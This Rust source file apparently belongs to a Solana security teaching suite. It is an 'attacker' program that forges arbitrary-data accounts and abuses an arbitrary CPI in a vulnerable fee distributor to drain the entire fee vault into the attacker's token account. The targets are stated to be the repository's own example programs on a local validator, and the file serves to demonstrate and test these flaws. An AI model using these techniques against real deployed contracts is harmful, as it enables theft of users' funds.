//! The EXPLOIT program used by the test suite to demonstrate theft.
//! Educational purpose only — every mode here attacks one of the vulnerable
//! example programs in this same repository on a local test validator.
//!
//! Modes (first byte of instruction data):
//!   0 — no-op success (a "fake program" that always returns Ok)
//!   1 — forge a data account: create_account(owner = attacker) and write
//!       arbitrary payload bytes into it (used by vuln03 / vuln09)
//!   2 — arbitrary-CPI abuse (vuln05): using the delegated PDA signer,
//!       transfer the ENTIRE fee vault to the attacker's token account
//!
//! VICTIM PROGRAM IDS ARE HARDCODED — these are OUR OWN example programs
//! deployed on a local test validator, not real mainnet protocols.

use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    instruction::{AccountMeta, Instruction},
    msg,
    program::{invoke, invoke_signed},
    program_error::ProgramError,
    pubkey::Pubkey,
    system_instruction,
    sysvar::{rent::Rent, Sysvar},
};

entrypoint!(process_instruction);

/// The program being attacked by mode 2 (vuln05 fee distributor).
const VULN05_ID: Pubkey =
    solana_program::pubkey!("HVKUuXZRopCRHD6Ne2KJ3Aqapb99sHRdhG8asyDdz1NQ");

fn process_instruction(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    data: &[u8],
) -> ProgramResult {
    msg!("attacker::process_instruction mode={}", data.first().copied().unwrap_or(255));
    match data.first().copied().unwrap_or(255) {
        0 => Ok(()),
        1 => forge_account(program_id, accounts, &data[1..]),
        2 => drain_delegated_vault(accounts),
        _ => Err(ProgramError::InvalidInstructionData),
    }
}

// ---------------------------------------------------------------------------
// mode 1 — forge an arbitrary-data account owned by this (attacker) program
// accounts[0] = forge PDA  [b"forge", payload[0..8]] (writable)
// accounts[1] = payer (signer)
// accounts[2] = system program (required to be present for the CPI)
// data[1..]   = payload bytes to write
// The forged account is a PDA of this program: the modern system program
// requires the created account to sign, and only a PDA of ours can "sign"
// via invoke_signed.
// ---------------------------------------------------------------------------
fn forge_account(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    payload: &[u8],
) -> ProgramResult {
    let ai = &mut accounts.iter();
    let new_acc = next_account_info(ai)?;
    let payer = next_account_info(ai)?;
    let system_program = next_account_info(ai)?;

    if !payer.is_signer {
        return Err(ProgramError::MissingRequiredSignature);
    }
    if system_program.key != &solana_program::system_program::id() {
        return Err(ProgramError::IncorrectProgramId);
    }

    let seed_len = payload.len().min(8);
    let (forge_pda, bump) = Pubkey::find_program_address(&[b"forge".as_ref(), &payload[..seed_len]], program_id);
    if new_acc.key != &forge_pda {
        return Err(ProgramError::InvalidSeeds);
    }

    let lamports = Rent::get()?.minimum_balance(payload.len().max(1));
    invoke_signed(
        &system_instruction::create_account(
            payer.key,
            &forge_pda,
            lamports,
            payload.len() as u64,
            program_id,
        ),
        &[payer.clone(), new_acc.clone(), system_program.clone()],
        &[&[b"forge".as_ref(), &payload[..seed_len], &[bump]]],
    )?;

    // Owner program may write data into its own accounts.
    let mut acc_data = new_acc.try_borrow_mut_data()?;
    acc_data[..payload.len()].copy_from_slice(payload);
    msg!("forged account {} with {} bytes", new_acc.key, payload.len());
    Ok(())
}

// ---------------------------------------------------------------------------
// mode 2 — arbitrary CPI abuse of vuln05 (fee distributor)
// Called BY vuln05 with the fee PDA as a privileged signer:
//   a[0] fee_pda            (signer, delegated by vuln05)
//   a[1] fee_vault_ta       (source token account, owned by fee_pda)
//   a[2] treasury_ta        (ignored)
//   a[3] token_program
//   a[4] attacker_ata       (first "extra" account forwarded by vuln05)
// ---------------------------------------------------------------------------
fn drain_delegated_vault(accounts: &[AccountInfo]) -> ProgramResult {
    let ai = &mut accounts.iter();
    let fee_pda = next_account_info(ai)?;
    let fee_vault = next_account_info(ai)?;
    let _treasury = next_account_info(ai)?;
    let token_program = next_account_info(ai)?;
    let attacker_ata = next_account_info(ai)?;

    if fee_vault.data_len() < 72 {
        return Err(ProgramError::InvalidAccountData);
    }
    let amount = u64::from_le_bytes(
        fee_vault.try_borrow_data()?[64..72]
            .try_into()
            .map_err(|_| ProgramError::InvalidAccountData)?,
    );
    msg!("stealing {} tokens from fee vault", amount);

    // SPL Token `Transfer` (instruction 3): [source, dest, authority]
    let mut ix_data = vec![3u8];
    ix_data.extend_from_slice(&amount.to_le_bytes());
    let transfer_ix = Instruction::new_with_bytes(
        *token_program.key,
        &ix_data,
        vec![
            AccountMeta::new(*fee_vault.key, false),
            AccountMeta::new(*attacker_ata.key, false),
            AccountMeta::new_readonly(*fee_pda.key, true),
        ],
    );
    // The fee PDA is privileged (vuln05 signed it into this call), so plain
    // `invoke` suffices — no seeds needed on our side.
    invoke(
        &transfer_ix,
        &[fee_vault.clone(), attacker_ata.clone(), fee_pda.clone()],
    )
}

/// Unused placeholder to keep VULN05_ID referenced in builds without mode 2.
#[allow(dead_code)]
fn victim_ids_demo() -> Pubkey {
    VULN05_ID
}
